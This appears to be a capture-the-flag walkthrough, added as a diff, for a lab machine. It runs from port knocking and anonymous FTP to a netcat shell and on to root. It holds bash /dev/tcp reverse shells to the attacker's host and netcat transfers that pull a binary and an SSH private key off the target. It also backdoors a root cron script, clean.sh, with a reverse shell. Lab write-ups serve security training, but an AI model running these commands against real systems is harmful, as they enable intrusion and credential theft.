@@ -1,0 +1,89 @@
+1) Found ports 22(ssh) and 80(http) open, so logged to the website
+
+**************************************************************
+
+2) Found the numbers 1111,2222,3333,4444
+and used them with port knock to try and open potential ports:
+- knock <ip> 1111 2222 3333 4444
+
+***************************************************************
+ 
+3) After port knocking found with nmap port 21 open (ftp)
+and connected through anonymous ftp connection:
+- ftp
+- open <url or ip> port
+
+and credentials for anonymous ftp:
+username: anonymous
+
+*************************************************************** 
+
+4) Found a file note.txt and downloaded it with:
+- get note.txt
+
+***************************************************************
+
+5) The context of the note was:
+In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
+
+Connect to port 4420, the password is sardinethecat.
+- catlover
+
+****************************************************************
+
+6) Using netcat and the password I was able to connect:
+nc -nv <ip> 4420
+
+****************************************************************
+
+7) Found in /home/catlover the file "runme", which needed regular shell and got it 
+by starting a netcat listener on my local machine:
+- nc -lvnp 1337
+and calling it from the remote with:
+- bash -c 'bash -i >& /dev/tcp/<my ip>/1337 0>&1'
+
+****************************************************************
+
+8) Then downloaded the runme file in my local machine by listening with:
+- nc -lvnp 1338 > runme
+and executing on the remote:
+- nc <my local ip> 1338 < /home/catlover/runme
+
+****************************************************************
+
+9) Run strings on the runme file and got the password for running 
+the runme file: "rebecca"
+which was used to run the 'runme' file
+
+****************************************************************
+
+10) After running the 'runme' file a public rsa key was created in the 
+/home/catlover directory
+
+****************************************************************
+
+11) Transfered the key to my local with:
+- nc -lvnp 1222 > id_rsa (locally)
+- nc <my ip> 1222 < /home/catlover/id_rsa (remotely)
+
+****************************************************************
+
+12) With the rsa key I ssh into the attacked machine after changing the
+permissions of the rsa key:
+- chmod 600 id_rsa
+- ssh -i id_rsa catlover@<remote ip>
+
+****************************************************************
+
+13) The first flag was in the root directory in the flag.txt file
+
+****************************************************************
+
+14) After examining the .bash_history, I append a reverse shell in clean.sh, to
+get a root's shell:
+- nc -lvnp 1234 (locally)
+- echo 'bash -i >&/dev/tcp/<my IP>/1234 <&1' >> /opt/clean/clean.sh (remotely)
+
+****************************************************************
+
+15) Finally the root flag was in /root/root.txt
